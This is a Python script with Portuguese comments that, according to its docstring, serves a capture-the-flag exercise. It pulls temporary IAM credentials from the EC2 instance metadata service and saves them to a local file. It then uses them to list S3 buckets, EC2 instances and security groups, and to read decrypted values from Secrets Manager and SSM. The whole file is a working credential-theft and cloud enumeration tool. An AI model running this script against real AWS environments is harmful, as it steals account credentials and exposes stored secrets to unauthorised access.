#!/usr/bin/env python3
"""
Script para obter credenciais AWS do metadata service da EC2
e buscar a chave do segundo módulo do CTF
"""

import requests
import json
import boto3
from botocore.exceptions import ClientError
import sys

# Metadata service URL da EC2
METADATA_BASE = "http://169.254.169.254/latest/meta-data"
IAM_BASE = "http://169.254.169.254/latest/meta-data/iam/security-credentials"

def get_metadata(path):
    """Obtém dados do metadata service da EC2"""
    try:
        url = f"{METADATA_BASE}/{path}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return response.text.strip()
        return None
    except Exception as e:
        print(f"Erro ao obter {path}: {e}")
        return None

def get_iam_role():
    """Obtém o IAM role associado à instância"""
    try:
        response = requests.get(IAM_BASE, timeout=5)
        if response.status_code == 200:
            return response.text.strip()
        return None
    except Exception as e:
        print(f"Erro ao obter IAM role: {e}")
        return None

def get_credentials(role_name):
    """Obtém as credenciais temporárias do IAM role"""
    try:
        url = f"{IAM_BASE}/{role_name}"
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return json.loads(response.text)
        return None
    except Exception as e:
        print(f"Erro ao obter credenciais: {e}")
        return None

def enumerate_s3_resources(credentials):
    """Enumera recursos S3 usando as credenciais"""
    try:
        session = boto3.Session(
            aws_access_key_id=credentials['AccessKeyId'],
            aws_secret_access_key=credentials['SecretAccessKey'],
            aws_session_token=credentials['Token'],
            region_name='us-east-1'
        )
        s3 = session.client('s3')
        buckets = s3.list_buckets()
        print("\n[+] Buckets S3 encontrados:")
        for bucket in buckets.get('Buckets', []):
            print(f"  - {bucket['Name']}")
            try:
                objects = s3.list_objects_v2(Bucket=bucket['Name'], MaxKeys=10)
                if 'Contents' in objects:
                    print(f"    Objetos (primeiros 10):")
                    for obj in objects['Contents']:
                        print(f"      - {obj['Key']}")
            except Exception as e:
                print(f"    Erro ao listar objetos: {e}")
    except Exception as e:
        print(f"Erro ao enumerar S3: {e}")

def enumerate_ec2_resources(credentials):
    """Enumera recursos EC2 usando as credenciais"""
    try:
        session = boto3.Session(
            aws_access_key_id=credentials['AccessKeyId'],
            aws_secret_access_key=credentials['SecretAccessKey'],
            aws_session_token=credentials['Token'],
            region_name='us-east-1'
        )
        ec2 = session.client('ec2')
        
        # Listar instâncias
        instances = ec2.describe_instances()
        print("\n[+] Instâncias EC2 encontradas:")
        for reservation in instances.get('Reservations', []):
            for instance in reservation.get('Instances', []):
                print(f"  - Instance ID: {instance.get('InstanceId')}")
                print(f"    State: {instance.get('State', {}).get('Name')}")
                print(f"    Public IP: {instance.get('PublicIpAddress', 'N/A')}")
                print(f"    Private IP: {instance.get('PrivateIpAddress', 'N/A')}")
                print(f"    Tags: {instance.get('Tags', [])}")
        
        # Listar security groups
        sgs = ec2.describe_security_groups()
        print("\n[+] Security Groups encontrados:")
        for sg in sgs.get('SecurityGroups', []):
            print(f"  - {sg.get('GroupName')} ({sg.get('GroupId')})")
            
    except Exception as e:
        print(f"Erro ao enumerar EC2: {e}")

def enumerate_secrets_manager(credentials):
    """Enumera secrets no AWS Secrets Manager"""
    try:
        session = boto3.Session(
            aws_access_key_id=credentials['AccessKeyId'],
            aws_secret_access_key=credentials['SecretAccessKey'],
            aws_session_token=credentials['Token'],
            region_name='us-east-1'
        )
        sm = session.client('secretsmanager')
        secrets = sm.list_secrets()
        print("\n[+] Secrets encontrados:")
        for secret in secrets.get('SecretList', []):
            print(f"  - {secret.get('Name')}")
            try:
                secret_value = sm.get_secret_value(SecretId=secret['Name'])
                print(f"    Valor: {secret_value.get('SecretString', 'N/A')[:100]}")
            except Exception as e:
                print(f"    Erro ao obter valor: {e}")
    except Exception as e:
        print(f"Erro ao enumerar Secrets Manager: {e}")

def enumerate_ssm_parameters(credentials):
    """Enumera parâmetros do Systems Manager"""
    try:
        session = boto3.Session(
            aws_access_key_id=credentials['AccessKeyId'],
            aws_secret_access_key=credentials['SecretAccessKey'],
            aws_session_token=credentials['Token'],
            region_name='us-east-1'
        )
        ssm = session.client('ssm')
        params = ssm.describe_parameters()
        print("\n[+] Parâmetros SSM encontrados:")
        for param in params.get('Parameters', []):
            print(f"  - {param.get('Name')}")
            try:
                param_value = ssm.get_parameter(Name=param['Name'], WithDecryption=True)
                print(f"    Valor: {param_value['Parameter']['Value'][:100]}")
            except Exception as e:
                print(f"    Erro ao obter valor: {e}")
    except Exception as e:
        print(f"Erro ao enumerar SSM: {e}")

def main():
    print("=" * 60)
    print("Script de Obtenção de Credenciais AWS EC2")
    print("=" * 60)
    
    # Obter informações básicas da instância
    print("\n[1] Obtendo informações da instância EC2...")
    instance_id = get_metadata("instance-id")
    if instance_id:
        print(f"  Instance ID: {instance_id}")
    
    region = get_metadata("placement/region")
    if region:
        print(f"  Region: {region}")
    
    # Obter IAM role
    print("\n[2] Obtendo IAM role...")
    role_name = get_iam_role()
    if not role_name:
        print("  [!] Nenhum IAM role encontrado")
        print("  [!] Tentando obter credenciais diretamente...")
        # Tentar obter credenciais diretamente
        try:
            url = f"{IAM_BASE}/"
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                role_name = response.text.strip().split('\n')[0]
                print(f"  Role encontrado: {role_name}")
        except:
            pass
    
    if not role_name:
        print("  [!] Não foi possível obter IAM role")
        print("  [!] Isso pode significar que:")
        print("      - A instância não tem IAM role associado")
        print("      - O metadata service não está acessível")
        print("      - Você não está executando dentro de uma instância EC2")
        return
    
    # Obter credenciais temporárias
    print(f"\n[3] Obtendo credenciais temporárias do role '{role_name}'...")
    credentials = get_credentials(role_name)
    
    if not credentials:
        print("  [!] Não foi possível obter credenciais")
        return
    
    print(f"  AccessKeyId: {credentials.get('AccessKeyId', 'N/A')}")
    print(f"  Expiration: {credentials.get('Expiration', 'N/A')}")
    
    # Salvar credenciais em arquivo
    print("\n[4] Salvando credenciais em arquivo...")
    with open('aws_credentials.json', 'w') as f:
        json.dump(credentials, f, indent=2)
    print("  Credenciais salvas em: aws_credentials.json")
    
    # Enumerar recursos AWS
    print("\n[5] Enumerando recursos AWS...")
    
    print("\n--- Enumerando S3 ---")
    enumerate_s3_resources(credentials)
    
    print("\n--- Enumerando EC2 ---")
    enumerate_ec2_resources(credentials)
    
    print("\n--- Enumerando Secrets Manager ---")
    enumerate_secrets_manager(credentials)
    
    print("\n--- Enumerando SSM Parameters ---")
    enumerate_ssm_parameters(credentials)
    
    print("\n" + "=" * 60)
    print("Concluído!")
    print("=" * 60)

if __name__ == "__main__":
    main()
